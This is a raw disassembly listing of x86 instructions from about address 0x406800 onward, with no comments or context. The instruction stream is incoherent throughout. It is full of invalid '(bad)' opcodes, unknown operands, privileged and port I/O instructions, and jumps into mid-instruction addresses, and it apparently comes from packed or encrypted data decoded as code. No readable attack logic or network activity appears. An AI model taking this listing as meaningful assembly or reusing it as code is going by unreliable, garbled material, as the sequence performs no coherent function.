  40680a:	push   esp
  40680b:	enter  0xfe17,0x14
  40680f:	rcl    esp,1
  406811:	inc    eax
  406812:	jl     0x406801
  406814:	test   DWORD PTR [ebx-0x2148772f],esp
  40681a:	inc    edx
  40681b:	ds inc edi
  40681d:	adc    BYTE PTR [ecx],bh
  40681f:	sbb    edx,DWORD PTR [eax+0x63]
  406822:	pop    ds
  406823:	and    eax,DWORD PTR [edi-0x44bd52ca]
  406829:	xlat   BYTE PTR ds:[ebx]
  40682a:	inc    esi
  40682b:	mov    ?,WORD PTR [ecx]
  40682d:	sub    edx,DWORD PTR [esi]
  40682f:	and    DWORD PTR [edi-0x75],eax
  406832:	pop    ebp
  406833:	inc    ebp
  406834:	sub    ch,bl
  406836:	or     BYTE PTR [edx-0x3127dbc2],0xa0
  40683d:	pop    ebx
  40683e:	mov    bh,0xdd
  406840:	lds    ebx,FWORD PTR [ebx-0x4]
  406843:	push   ecx
  406844:	pop    DWORD PTR [edx-0x5942cba0]
  40684a:	or     eax,0x65bf5184
  40684f:	pop    edx
  406850:	fimul  WORD PTR [edi+0xe]
  406853:	(bad)  
  406854:	mov    esi,0x36d789d8
  406859:	les    ebp,FWORD PTR [ecx]
  40685b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40685c:	push   es
  40685d:	jbe    0x40680e
  40685f:	loopne 0x406855
  406861:	rcr    BYTE PTR [edi-0x28],1
  406864:	clc    
  406865:	mov    ds:0xd88e0594,al
  40686a:	lods   eax,DWORD PTR ds:[esi]
  40686b:	mov    ebx,0xe86815de
  406870:	ja     0x40686a
  406872:	sbb    esp,DWORD PTR [edx]
  406874:	jp     0x406849
  406876:	sbb    eax,0x2a892a4f
  40687b:	mov    ch,BYTE PTR [eax-0x42]
  40687e:	stos   DWORD PTR es:[edi],eax
  40687f:	pop    ss
  406880:	idiv   DWORD PTR [ecx-0x4]
  406883:	repz add eax,0xded903d3
  406889:	dec    esp
  40688a:	add    bl,al
  40688c:	sbb    BYTE PTR [edx-0x41],bl
  40688f:	mov    esp,0xc4e6c475
  406894:	pop    ecx
  406895:	jmp    0x406860
  406897:	ss js  0x4068d2
  40689a:	loop   0x406873
  40689c:	imul   edi,DWORD PTR [eax-0x2866cdb3],0xfffffffb
  4068a3:	stos   DWORD PTR es:[edi],eax
  4068a4:	adc    ch,BYTE PTR [ebx+edi*4-0x4a]
  4068a8:	add    BYTE PTR [ebp-0x11a73558],al
  4068ae:	dec    edx
  4068af:	stos   DWORD PTR es:[edi],eax
  4068b0:	inc    esp
  4068b1:	cmp    BYTE PTR [edx],dh
  4068b3:	xor    ecx,DWORD PTR [edi]
  4068b5:	ins    DWORD PTR es:[edi],dx
  4068b6:	pop    eax
  4068b7:	lahf   
  4068b8:	cld    
  4068b9:	jns    0x40686d
  4068bb:	jns    0x4068ad
  4068bd:	cld    
  4068be:	dec    edi
  4068bf:	loope  0x4068eb
  4068c1:	dec    edx
  4068c2:	cmp    BYTE PTR [edx+0x38],dh
  4068c5:	fisub  DWORD PTR [ebp-0x6f]
  4068c8:	push   ecx
  4068c9:	(bad)  
  4068ca:	xchg   edi,eax
  4068cb:	mov    esp,0x80b08aa3
  4068d0:	fidivr WORD PTR [eax]
  4068d2:	cmp    cl,BYTE PTR [eax]
  4068d4:	cmp    al,0xe4
  4068d6:	jne    0x406949
  4068d8:	enter  0x3cf6,0xe9
  4068dc:	push   cs
  4068dd:	(bad)  
  4068df:	fild   WORD PTR [esi]
  4068e1:	clc    
  4068e2:	push   DWORD PTR [ecx-0xf]
  4068e5:	push   ecx
  4068e6:	push   ebx
  4068e7:	jne    0x406909
  4068e9:	das    
  4068ea:	xchg   DWORD PTR [edi-0x25bdc75f],ecx
  4068f0:	push   ds
  4068f1:	jg     0x4068cb
  4068f3:	and    DWORD PTR [ebx],eax
  4068f5:	add    eax,0xae13f276
  4068fa:	iret   
  4068fb:	ja     0x4068f4
  4068fd:	int3   
  4068fe:	mov    dl,0xba
  406900:	lods   al,BYTE PTR ds:[esi]
  406901:	cmp    al,0x10
  406903:	(bad)  
  406904:	push   edi
  406905:	sub    DWORD PTR [esi+0x73233a3],0xbe2e622b
  40690f:	xor    DWORD PTR [ebx+0xf],edx
  406912:	push   es
  406913:	cmp    BYTE PTR [ebx-0x2d686658],cl
  406919:	outs   dx,DWORD PTR ds:[esi]
  40691a:	into   
  40691b:	ror    BYTE PTR [edi-0x379e6497],1
  406921:	jo     0x40694b
  406923:	mov    dh,0x34
  406925:	sbb    eax,0x50b1a090
  40692a:	call   0x2f3264b7
  40692f:	outs   dx,DWORD PTR ds:[esi]
  406930:	push   es
  406931:	fist   WORD PTR [eax+0x2956d13c]
  406937:	adc    BYTE PTR [esi],bh
  406939:	adc    ecx,ebx
  40693b:	xchg   ebx,eax
  40693c:	imul   esp,DWORD PTR [ecx-0x13c7a7f8],0xffffffe4
  406943:	fidivr WORD PTR [edi+0x45e8ac1b]
  406949:	pop    edi
  40694a:	inc    ebp
  40694b:	ds cwde 
  40694d:	rcl    BYTE PTR [ebx-0xa25ce9d],cl
  406953:	sbb    bh,BYTE PTR [esi+ebx*1]
  406956:	cmp    dl,BYTE PTR [eax+0x1e]
  406959:	add    bh,ah
  40695b:	jg     0x40694f
  40695d:	mov    ebp,0x6e1d9eb6
  406962:	jp     0x4068e8
  406964:	pop    esi
  406965:	lock mov BYTE PTR [edx+0x3bec8c2b],cl
  40696c:	pop    es
  40696d:	int    0x36
  40696f:	gs int 0xe0
  406972:	sbb    DWORD PTR [ebx],esi
  406974:	stos   BYTE PTR es:[edi],al
  406975:	xor    DWORD PTR [eax+0x4f],esi
  406978:	inc    ebx
  406979:	cmp    ecx,0x261a4064
  40697f:	mov    edi,0x280f94a4
  406984:	or     eax,esi
  406986:	mov    ebx,0x6b71519f
  40698b:	mov    al,0x6
  40698d:	jne    0x40699a
  40698f:	rcr    DWORD PTR [ebp-0x200a1957],1
  406995:	inc    esi
  406996:	mov    ebp,0xd14e6d3f
  40699b:	sub    BYTE PTR ss:[ecx+0x2f],bh
  40699f:	imul   ebx,DWORD PTR [eax],0x9ad4276
  4069a5:	test   al,0x77
  4069a7:	dec    ecx
  4069a8:	(bad)  
  4069a9:	popa   
  4069aa:	sbb    ebp,DWORD PTR [ecx]
  4069ac:	add    DWORD PTR [ebp-0x31],ebx
  4069af:	repnz dec esi
  4069b1:	jno    0x406949
  4069b3:	loopne 0x4069d1
  4069b5:	jo     0x4069cc
  4069b7:	bound  esi,QWORD PTR [ebx-0x60]
  4069ba:	jg     0x406967
  4069bc:	jae    0x406a34
  4069be:	cmp    bl,BYTE PTR [ebp+0x38]
  4069c1:	xor    eax,DWORD PTR cs:[ebx+eiz*2+0x44]
  4069c6:	sub    dl,BYTE PTR ds:0x4c70409f
  4069cc:	push   es
  4069cd:	push   esp
  4069ce:	push   ecx
  4069cf:	pop    edx
  4069d0:	shl    DWORD PTR fs:[esi],1
  4069d3:	hlt    
  4069d4:	fdivrp st(5),st
  4069d6:	cmp    edx,ebp
  4069d8:	test   DWORD PTR ds:0xe1f276cd,ebx
  4069de:	xor    DWORD PTR [edx-0x77c695ad],ebp
  4069e4:	rcr    DWORD PTR cs:[ecx+0x69],0x65
  4069e9:	scas   eax,DWORD PTR es:[edi]
  4069ea:	sub    ah,ah
  4069ec:	sbb    eax,0xe23bcc58
  4069f1:	cmp    esp,DWORD PTR [ebx+ecx*1-0x4300d21c]
  4069f8:	(bad)  
  4069f9:	adc    BYTE PTR [esp+esi*4+0x28],cl
  4069fd:	pop    ebp
  4069fe:	push   0x53e96623
  406a03:	xor    eax,0x2d1a0a19
  406a08:	pop    ebp
  406a09:	xchg   ebp,eax
  406a0a:	sub    al,0x61
  406a0c:	sub    eax,0x6aceabd1
  406a11:	lds    esp,FWORD PTR [edx]
  406a13:	inc    esi
  406a14:	inc    ecx
  406a15:	mov    dl,0xc4
  406a17:	rol    DWORD PTR [ebx],cl
  406a19:	xor    al,0xb7
  406a1b:	mov    dh,0xbb
  406a1d:	push   eax
  406a1e:	lahf   
  406a1f:	cmc    
  406a20:	mov    ebx,0xd11cb67c
  406a25:	addr16 ret 0x9008
  406a29:	pusha  
  406a2a:	inc    esi
  406a2b:	hlt    
  406a2c:	lods   eax,DWORD PTR ds:[esi]
  406a2d:	mov    ch,0xf7
  406a2f:	ret    0x8391
  406a32:	sub    eax,0x524bb714
  406a37:	xchg   bh,dh
  406a39:	mov    dh,0x46
  406a3b:	jbe    0x406ab6
  406a3d:	adc    eax,0x6e10df13
  406a42:	aam    0x90
  406a44:	int3   
  406a45:	adc    ch,0x56
  406a48:	mov    dl,dl
  406a4a:	mul    BYTE PTR ds:0xb96e3361
  406a50:	mov    eax,0x114dd591
  406a55:	loope  0x406a2a
  406a57:	inc    eax
  406a58:	push   edx
  406a59:	inc    eax
  406a5a:	inc    esi
  406a5b:	sbb    ebp,ebp
  406a5d:	call   FWORD PTR [edx-0x280d8a01]
  406a63:	pop    eax
  406a64:	mov    dl,BYTE PTR [eax-0x64956750]
  406a6a:	jne    0x406ab0
  406a6c:	fs cmp eax,0x91fe2e9f
  406a72:	mov    cs,WORD PTR [edi]
  406a74:	lods   eax,DWORD PTR ds:[esi]
  406a75:	dec    ebx
  406a76:	xchg   ebx,eax
  406a77:	imul   esi,eax,0xfffffffb
  406a7a:	inc    eax
  406a7b:	lods   eax,DWORD PTR ds:[esi]
  406a7c:	in     al,dx
  406a7d:	or     al,0xd
  406a7f:	test   edx,edi
  406a81:	inc    edi
  406a82:	cdq    
  406a83:	outs   dx,DWORD PTR ds:[esi]
  406a84:	dec    edi
  406a85:	out    dx,al
  406a86:	push   ds
  406a87:	sub    eax,0xce264662
  406a8c:	les    ecx,FWORD PTR [edx]
  406a8e:	mov    ecx,0x2f4556ba
  406a93:	push   cs
  406a94:	mov    eax,0x95a89fc9
  406a99:	or     BYTE PTR [edx],cl
  406a9b:	pop    eax
  406a9c:	shl    DWORD PTR [edi],cl
  406a9e:	inc    esp
  406a9f:	aam    0x75
  406aa1:	dec    esi
  406aa2:	js     0x406a27
  406aa4:	aaa    
  406aa5:	addr16 push edi
  406aa7:	ret    
  406aa8:	adc    eax,0x6106991b
  406aad:	pop    ss
  406aae:	add    DWORD PTR ds:0xe7899493,esp
  406ab4:	mov    edx,0x7b09bbb1
  406ab9:	jae    0x406a97
  406abb:	rol    cl,0xdc
  406abe:	xchg   ebx,eax
  406abf:	adc    al,0x0
  406ac1:	add    DWORD PTR [ecx+0x1b],edi
  406ac4:	ja     0x406a4d
  406ac6:	pushf  
  406ac7:	push   ecx
  406ac8:	inc    edi
  406ac9:	pushf  
  406aca:	sahf   
  406acb:	jae    0x406add
  406acd:	frstor [ecx+0x345fd272]
  406ad3:	pop    ecx
  406ad4:	xor    DWORD PTR ds:0xcf458ca3,edx
  406ada:	call   0x529c:0x9578fe53
  406ae1:	jge    0x406b12
  406ae3:	inc    ebx
  406ae4:	sti    
  406ae5:	outs   dx,BYTE PTR ds:[esi]
  406ae6:	jo     0x406b2a
  406ae8:	sbb    ebp,ecx
  406aea:	adc    al,0x15
  406aec:	das    
  406aed:	out    dx,al
  406aee:	ins    DWORD PTR es:[edi],dx
  406aef:	push   esp
  406af0:	fdiv   QWORD PTR [esi]
  406af2:	aad    0xc3
  406af4:	emms   
  406af6:	dec    esi
  406af7:	or     BYTE PTR [ebx+0xe],dl
  406afa:	outs   dx,BYTE PTR ds:[esi]
  406afb:	repz rol BYTE PTR ds:0xc28a80ff,0xf8
  406b03:	(bad)  
  406b04:	enter  0x3ca4,0x68
  406b08:	jp     0x406b44
  406b0a:	jmp    0xfb9c:0xc2a441c3
  406b11:	cmp    eax,0x3c50cb0d
  406b16:	fwait
  406b17:	cmp    ebp,DWORD PTR [ebp+0x6432742f]
  406b1d:	out    dx,eax
  406b1e:	sub    dh,BYTE PTR fs:[edi-0x46]
  406b22:	inc    ecx
  406b23:	mov    WORD PTR [edi],cs
  406b25:	mov    ebp,0xb46abb12
  406b2a:	push   esp
  406b2b:	cdq    
  406b2c:	div    ch
  406b2e:	es pop esi
  406b30:	aam    0x8d
  406b32:	(bad)  
  406b33:	mov    bl,0x3b
  406b35:	leave  
  406b36:	push   esi
  406b37:	iret   
  406b38:	int3   
  406b39:	adc    edx,ebx
  406b3b:	(bad)  
  406b3c:	je     0x406b5c
  406b3e:	sub    eax,0x72c72928
  406b43:	inc    esi
  406b44:	add    eax,0x6463696c
  406b49:	stos   DWORD PTR es:[edi],eax
  406b4a:	pop    esp
  406b4b:	pop    es
  406b4c:	mov    dl,BYTE PTR [ebp-0x58]
  406b4f:	and    bh,BYTE PTR [ebx]
  406b51:	fwait
  406b52:	call   0x9bfe:0xb30ddd30
  406b59:	mov    bh,0x9
  406b5b:	push   ds
  406b5c:	dec    ecx
  406b5d:	setp   BYTE PTR [edx]
  406b60:	pusha  
  406b61:	dec    ecx
  406b62:	push   0x940acb0d
  406b67:	fwait
  406b68:	mov    dl,0xac
  406b6a:	mov    al,ds:0x65bee473
  406b6f:	xor    edi,edi
  406b71:	pop    ebp
  406b72:	push   ds
  406b73:	cmp    ch,BYTE PTR [ebx+0x35]
  406b76:	add    ch,BYTE PTR [edi-0x51]
  406b79:	bnd jg 0x406be8
  406b7c:	mov    BYTE PTR [ebp+0x11],ch
  406b7f:	jp     0x406b0a
  406b81:	cmp    BYTE PTR [edi+edi*8+0x7c01b76a],0x40
  406b89:	pop    ss
  406b8a:	push   es
  406b8b:	fstp   QWORD PTR [ebx-0x8]
  406b8e:	xchg   esp,eax
  406b8f:	adc    al,0x1e
  406b91:	push   ds
  406b92:	dec    ebx
  406b93:	mov    edx,0x6e28c1c7
  406b98:	inc    edx
  406b99:	loop   0x406bf7
  406b9b:	sub    BYTE PTR [esi],al
  406b9d:	add    BYTE PTR [ebx+0x4f09d1b0],ah
  406ba3:	outs   dx,DWORD PTR ds:[esi]
  406ba4:	jmp    0xdd6d9696
  406ba9:	dec    edx
  406baa:	pop    ds
  406bab:	or     dl,0xc3
  406bae:	mov    bh,0xe3
  406bb0:	ins    BYTE PTR es:[edi],dx
  406bb1:	fdiv   DWORD PTR es:[esi+0x76]
  406bb5:	add    eax,0x8f811163
  406bba:	cmp    BYTE PTR [edi],bh
  406bbc:	aaa    
  406bbd:	enter  0x703b,0xf0
  406bc1:	ja     0x406ba6
  406bc3:	jge    0x406ba4
  406bc5:	call   0x4abe2cd4
  406bca:	mov    ebp,0x79260959
  406bcf:	sbb    edx,0x60
  406bd2:	mov    ds:0x6555bcee,eax
  406bd7:	loopne 0x406b6e
  406bd9:	mov    bl,0xca
  406bdb:	pop    edx
  406bdc:	lahf   
  406bdd:	inc    esi
  406bde:	js     0x406bf7
  406be0:	sub    eax,0xf138c42e
  406be5:	push   edi
  406be6:	daa    
  406be7:	xchg   esi,eax
  406be8:	push   edx
  406be9:	or     bl,cl
  406beb:	and    DWORD PTR [eax],edi
  406bed:	icebp  
  406bee:	outs   dx,DWORD PTR ds:[esi]
  406bef:	lock nop
  406bf1:	mov    BYTE PTR [ecx*1+0x72ac6ef4],al
  406bf8:	lea    eax,[esi+eiz*1]
  406bfb:	in     eax,0xb1
  406bfd:	mov    eax,ds:0xa8089c39
  406c02:	mov    eax,ds:0xb633e3ac
  406c07:	(bad)
  406c0a:	mov    ds:0x94fdf73f,al
  406c0f:	fbstp  TBYTE PTR [ebx-0x42b0b7e7]
  406c15:	scas   al,BYTE PTR es:[edi]
  406c16:	ret    
  406c17:	xchg   BYTE PTR [edx],cl
  406c19:	sub    eax,ebp
  406c1b:	clc    
  406c1c:	mov    al,ds:0x6426dab8
  406c21:	mov    edx,0x425bae66
  406c26:	or     bh,BYTE PTR [edi+0x33]
  406c29:	fcmove st,st(7)
  406c2b:	pop    ds
  406c2c:	cmp    al,0x85
  406c2e:	shr    BYTE PTR [edx-0xf],cl
  406c31:	sbb    eax,0x67290bfb
  406c36:	(bad)  
  406c37:	and    eax,0x23fa9444
  406c3c:	fisttp DWORD PTR [ebp-0x6f]
  406c3f:	mov    DWORD PTR [esi-0x7],0xb199402d
  406c46:	or     eax,DWORD PTR [edx+0x3e]
  406c49:	cld    
  406c4a:	push   ecx
  406c4b:	jo     0x406cbc
  406c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c4e:	sbb    DWORD PTR [ebx-0x24],edx
  406c51:	xor    BYTE PTR [esi-0x18],al
  406c54:	jns    0x406c9a
  406c56:	cmp    al,0xc8
  406c58:	mov    edx,0xd0ca520c
  406c5d:	(bad)
  406c61:	pop    esi
  406c62:	stos   DWORD PTR es:[edi],eax
  406c63:	or     eax,0xff15a952
  406c68:	pusha  
  406c69:	(bad)  
  406c6a:	mov    ch,0xb1
  406c6c:	stos   BYTE PTR es:[edi],al
  406c6d:	push   ecx
  406c6e:	(bad)  
  406c6f:	or     al,0x68
  406c71:	pop    ds
  406c72:	jo     0x406cef
  406c74:	fisttp DWORD PTR [ebx]
  406c76:	xchg   esp,eax
  406c77:	aaa    
  406c78:	sbb    ecx,DWORD PTR [edi+esi*8]
  406c7b:	cmp    esi,DWORD PTR [edi+0x78517bd5]
  406c81:	jg     0x406cc2
  406c83:	adc    DWORD PTR [edi-0x2c4241c9],0x2678446b
  406c8d:	icebp  
  406c8e:	push   esi
  406c8f:	sub    cl,BYTE PTR gs:[bx+di-0x590d]
  406c95:	sbb    eax,0x239d898d
  406c9a:	ja     0x406cbd
  406c9c:	fbstp  TBYTE PTR fs:[edi-0x3214e498]
  406ca3:	xlat   BYTE PTR ds:[ebx]
  406ca4:	arpl   WORD PTR [eax+0x3c4b54fd],di
  406caa:	fstp   QWORD PTR [eax]
  406cac:	(bad)
  406cb0:	mov    eax,0x6737f61b
  406cb5:	xchg   ebp,eax
  406cb6:	cmp    eax,0x96d09389
  406cbb:	rol    BYTE PTR [esi-0x7e],0x73
  406cbf:	inc    ecx
  406cc0:	mov    ch,0xd9
  406cc2:	cmp    al,0xb5
  406cc4:	mov    ebp,0xf0ef76e1
  406cc9:	push   eax
  406cca:	imul   esi,DWORD PTR [ebx+0x3a],0x5b
  406cce:	xchg   DWORD PTR [eax+0x58],eax
  406cd1:	fstp   QWORD PTR [ebp-0x4b2c1a2f]
  406cd7:	stos   BYTE PTR es:[edi],al
  406cd8:	sub    BYTE PTR gs:[ecx+0x7f124027],0x19
  406ce0:	lods   al,BYTE PTR ds:[esi]
  406ce1:	mov    ds,ebx
  406ce3:	cli    
  406ce4:	cdq    
  406ce5:	xor    eax,0x81a33c41
  406cea:	jg     0x406cd4
  406cec:	sahf   
  406ced:	shl    DWORD PTR [esi+edi*4+0x51],0xac
  406cf2:	push   esp
  406cf3:	xlat   BYTE PTR ds:[ebx]
  406cf4:	or     al,0x5e
  406cf6:	xor    ebx,DWORD PTR [edx+ebp*8+0x5f]
  406cfa:	(bad)  
  406cfb:	mov    bl,0xb8
  406cfd:	jne    0x406d0e
  406cff:	jmp    0x61051465
  406d04:	pop    eax
  406d05:	lea    eax,[ebx-0x62446c12]
  406d0b:	inc    edx
  406d0c:	pop    ebx
  406d0d:	shl    ch,1
  406d0f:	inc    esi
  406d10:	add    al,0x24
  406d12:	mov    ch,0x74
  406d14:	rcl    DWORD PTR [edx],1
  406d16:	call   0x7951689c
  406d1b:	fsubr  DWORD PTR [ebp-0x66]
  406d1e:	stos   BYTE PTR es:[edi],al
  406d1f:	scas   eax,DWORD PTR es:[edi]
  406d20:	xcrypt-ctr (bad)
  406d21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d22:	sbb    DWORD PTR [ebx],edx
  406d24:	mov    dl,0x81
  406d26:	dec    ebx
  406d27:	sbb    DWORD PTR [esi-0x7212758a],edx
  406d2d:	ret    0x4e75
  406d30:	sar    BYTE PTR [eax-0x7f],0x58
  406d34:	adc    eax,0x32c216a5
  406d39:	add    DWORD PTR [edi+0x49],edi
  406d3c:	lahf   
  406d3d:	dec    esi
  406d3e:	ret    
  406d3f:	lock mul esi
  406d42:	pop    es
  406d43:	mov    edx,cs
  406d45:	call   0x39ae:0x6c97696d
  406d4c:	fsub   st,st(4)
  406d4e:	scas   eax,DWORD PTR es:[edi]
  406d4f:	mov    al,0x93
  406d51:	cmp    cl,0x67
  406d54:	xchg   esp,eax
  406d55:	dec    esi
  406d56:	and    esp,DWORD PTR [ebx+0x22]
  406d59:	xchg   BYTE PTR [esi+0x51],bh
  406d5c:	aad    0xfe
  406d5e:	enter  0x663b,0x6d
  406d62:	or     dl,ah
  406d64:	ins    DWORD PTR es:[edi],dx
  406d65:	aas    
  406d66:	les    esp,FWORD PTR ds:0xb365127d
  406d6c:	scas   al,BYTE PTR es:[edi]
  406d6d:	ret    
  406d6e:	mov    ?,WORD PTR [eax+0xcae004b]
  406d74:	push   esi
  406d75:	scas   eax,DWORD PTR es:[edi]
  406d76:	add    esp,DWORD PTR [edi+ebp*4+0x31]
  406d7a:	mov    dh,0x41
  406d7c:	xchg   DWORD PTR [esi+0x0],edx
  406d7f:	(bad)  
  406d81:	shr    BYTE PTR [ebx-0x22],cl
  406d84:	mov    ch,0x1
  406d86:	fimul  DWORD PTR [edi]
  406d88:	pop    edx
  406d89:	scas   al,BYTE PTR es:[edi]
  406d8a:	loop   0x406d4c
  406d8c:	out    dx,eax
  406d8d:	inc    edi
  406d8e:	mov    esi,0xc437bafb
  406d93:	fbstp  TBYTE PTR [esi]
  406d95:	dec    ebx
  406d96:	leave  
  406d97:	jbe    0x406dde
  406d99:	dec    esp
  406d9a:	jo     0x406dc8
  406d9c:	add    ebx,edx
  406d9e:	push   es
  406d9f:	cs out 0x75,eax
  406da2:	add    edi,esp
  406da4:	pop    ds
  406da5:	add    eax,DWORD PTR [ebp*2-0x7d6d0f3f]
  406dac:	fwait
  406dad:	pusha  
  406dae:	das    
  406daf:	aam    0x5d
  406db1:	jbe    0x406de2
  406db3:	jl     0x406db9
  406db5:	push   esp
  406db6:	jae    0x406db6
  406db8:	mov    ds:0x2a338346,eax
  406dbd:	fdivr  st(5),st
  406dbf:	sti    
  406dc0:	fstp   QWORD PTR [edi-0x44ae0663]
  406dc6:	loope  0x406d89
  406dc8:	pushf  
  406dc9:	pushf  
  406dca:	mov    WORD PTR [eax-0x6f],ds
  406dcd:	sub    BYTE PTR [ebp-0x323a7988],0xb2
  406dd4:	das    
  406dd5:	inc    edi
  406dd6:	pop    ss
  406dd7:	js     0x406e1b
  406dd9:	imul   ebp,DWORD PTR [esi+esi*1+0x7cb057c7],0x7216b9c8
  406de4:	push   edx
  406de5:	mov    esp,DWORD PTR [eax]
  406de7:	test   BYTE PTR [eax],ah
  406de9:	push   ss
  406dea:	jo     0x406da9
  406dec:	nop
  406ded:	clc    
  406dee:	pop    ebx
  406def:	jl     0x406da6
  406df1:	and    DWORD PTR [edx-0x4ab3747a],esp
  406df7:	aaa    
  406df8:	cdq    
  406df9:	push   esp
  406dfa:	sub    BYTE PTR [edi-0x62],dh
  406dfd:	arpl   WORD PTR [edx],dx
  406dff:	inc    ebx
  406e00:	jns    0x406e57
  406e02:	bound  esp,QWORD PTR [eax]
  406e04:	cmp    esi,DWORD PTR [edi]
  406e06:	xor    DWORD PTR [ebx],edx
  406e08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e09:	mov    esp,0xae6c70b4
  406e0e:	mov    esi,0xd83a5991
  406e13:	mov    cl,0xe7
  406e15:	inc    esp
  406e16:	and    esi,DWORD PTR [edi+eax*8+0x69]
  406e1a:	dec    edx
  406e1b:	test   al,0xd6
  406e1d:	imul   esp,DWORD PTR [ecx],0xef6cada6
  406e23:	in     al,dx
  406e24:	adc    esi,eax
  406e26:	arpl   WORD PTR [ebx-0x626316f1],ax
  406e2c:	inc    edx
  406e2d:	add    ebp,DWORD PTR [eax-0x2d]
  406e30:	nop
  406e31:	sub    eax,0x824c6cc2
  406e36:	and    eax,0x71587b59
  406e3b:	loope  0x406e72
  406e3d:	sub    eax,DWORD PTR ds:0x1c8dbd41
  406e43:	pop    ds
  406e44:	sahf   
  406e45:	xchg   edi,eax
  406e46:	rcl    BYTE PTR [edi],cl
  406e48:	pop    edx
  406e49:	push   edi
  406e4a:	and    al,0x3b
  406e4c:	pop    ecx
  406e4d:	cmc    
  406e4e:	scas   eax,DWORD PTR es:[edi]
  406e4f:	mov    edx,0xd6e894a6
  406e54:	xlat   BYTE PTR ds:[ebx]
  406e55:	mov    ebx,ds
  406e57:	add    edx,ecx
  406e59:	jl     0x406e6a
  406e5b:	lods   al,BYTE PTR ds:[esi]
  406e5c:	lods   eax,DWORD PTR ds:[esi]
  406e5d:	fs adc ecx,ecx
  406e60:	scas   al,BYTE PTR es:[edi]
  406e61:	je     0x406ec3
  406e63:	inc    esp
  406e64:	or     DWORD PTR [ecx+0x31033c30],0xb696797b
  406e6e:	(bad)  
  406e6f:	cmc    
  406e70:	mov    WORD PTR [esi+0x8],?
  406e73:	mov    eax,0x14a493c2
  406e78:	lods   eax,DWORD PTR ds:[esi]
  406e79:	push   DWORD PTR [edx-0x228601c1]
  406e7f:	cli    
  406e80:	call   eax
  406e82:	push   ebp
  406e83:	sti    
  406e84:	or     BYTE PTR [edi+0x5c],dh
  406e87:	(bad)  
  406e88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e89:	mov    al,ds:0xce4eccae
  406e8e:	cmp    dl,bl
  406e90:	retf   0x1cf
  406e93:	movaps xmm5,XMMWORD PTR [esi-0x31]
  406e97:	imul   DWORD PTR [edx]
  406e99:	jb     0x406ed9
  406e9b:	fisubr WORD PTR [edi+eax*2+0x66462629]
  406ea2:	lea    ebp,ds:0x476982a
  406ea8:	pop    ebx
  406ea9:	mov    dh,0xa9
  406eab:	daa    
  406eac:	(bad)  
  406ead:	sbb    DWORD PTR [esi+0x6f],ecx
  406eb0:	add    al,bh
  406eb2:	mov    cl,0xbc
  406eb4:	(bad)  ds:0xfcc8786a
  406eba:	xchg   DWORD PTR [edi+0x57],ecx
  406ebd:	fsub   QWORD PTR [ebp+eiz*2-0x2093c1a0]
  406ec4:	push   cs
  406ec5:	jb     0x406f31
  406ec7:	shr    esp,0xe2
  406eca:	dec    esp
  406ecb:	in     eax,0xc3
  406ecd:	mov    edi,DWORD PTR [esi-0x2acbd1c6]
  406ed3:	je     0x406ed2
  406ed5:	xor    DWORD PTR [ecx],edi
  406ed7:	scas   eax,DWORD PTR es:[edi]
  406ed8:	push   0xffffff8c
  406eda:	dec    ecx
  406edb:	jmp    0x406edf
  406edd:	fdiv   QWORD PTR [eax]
  406edf:	scas   al,BYTE PTR es:[edi]
  406ee0:	add    DWORD PTR [edi],edx
  406ee2:	cmp    BYTE PTR [ebx],dh
  406ee4:	in     eax,0x43
  406ee6:	adc    BYTE PTR [edi+0x3d5cd09c],0xa
  406eed:	mov    ?,WORD PTR [ecx-0x39]
  406ef0:	popa   
  406ef1:	lods   al,BYTE PTR ds:[esi]
  406ef2:	ds loopne 0x406ef7
  406ef5:	pop    esp
  406ef6:	push   ss
  406ef7:	and    esi,DWORD PTR [edx-0x6b341d60]
  406efd:	push   0x14c4b472
  406f02:	shr    BYTE PTR [edi+0x70],cl
  406f05:	(bad)  
  406f06:	sbb    eax,0xcfb532e4
  406f0b:	inc    ecx
  406f0c:	or     eax,0x877cb9f7
  406f11:	ins    BYTE PTR es:[edi],dx
  406f12:	aas    
  406f13:	loopne 0x406f1a
  406f15:	loope  0x406ee8
  406f17:	je     0x406f55
  406f19:	(bad)  
  406f1a:	jmp    DWORD PTR [esi+0x2b]
  406f1d:	cli    
  406f1e:	cmc    
  406f1f:	dec    ebx
  406f20:	(bad)  
  406f22:	les    esi,FWORD PTR [ebp+0x2f636268]
  406f28:	mov    eax,0xce3f8c77
  406f2d:	dec    ebx
  406f2e:	pop    ss
  406f2f:	dec    ebx
  406f30:	sti    
  406f31:	fisttp DWORD PTR [edx+0x56]
  406f34:	push   cs
  406f35:	dec    esp
  406f36:	ins    BYTE PTR es:[edi],dx
  406f37:	ficom  WORD PTR [ebp-0x70]
  406f3a:	lahf   
  406f3b:	or     al,0xfb
  406f3d:	outs   dx,BYTE PTR ds:[esi]
  406f3e:	jnp    0x406f39
  406f40:	add    ebp,DWORD PTR [eax]
  406f42:	sbb    al,BYTE PTR [ecx]
  406f44:	loope  0x406ed5
  406f46:	int    0xba
  406f48:	push   esi
  406f49:	cmp    esi,DWORD PTR [edx+0x2d]
  406f4c:	sti    
  406f4d:	adc    al,0x5
  406f4f:	or     DWORD PTR [esi+0x50],edx
  406f52:	dec    ebp
  406f53:	fst    DWORD PTR [esi-0x2]
  406f56:	xchg   esi,eax
  406f57:	push   edi
  406f58:	ret    
  406f59:	jg     0x406f40
  406f5b:	(bad)  
  406f5c:	(bad)  
  406f5d:	loopne 0x406f7f
  406f5f:	or     BYTE PTR [edx],0x2a
  406f62:	inc    eax
  406f63:	push   esp
  406f64:	push   es
  406f65:	mov    bl,0xa0
  406f67:	jmp    0x67cd:0x33ad5f05
  406f6e:	fldcw  WORD PTR [ecx+0x75]
  406f71:	mov    ch,0x5c
  406f73:	std    
  406f74:	lahf   
  406f75:	lods   eax,DWORD PTR ds:[esi]
  406f76:	test   eax,0xe7784c32
  406f7b:	add    ebx,DWORD PTR [esi-0x319d42a5]
  406f81:	sbb    eax,0xe4002b52
  406f86:	lods   al,BYTE PTR ds:[esi]
  406f87:	and    cl,BYTE PTR [edi+eax*4-0x19]
  406f8b:	mov    ah,0x81
  406f8d:	pop    es
  406f8e:	inc    DWORD PTR [edx-0x3b62c11f]
  406f94:	leave  
  406f95:	cli    
  406f96:	or     ecx,DWORD PTR [esi-0x693039cc]
  406f9c:	outs   dx,DWORD PTR ds:[esi]
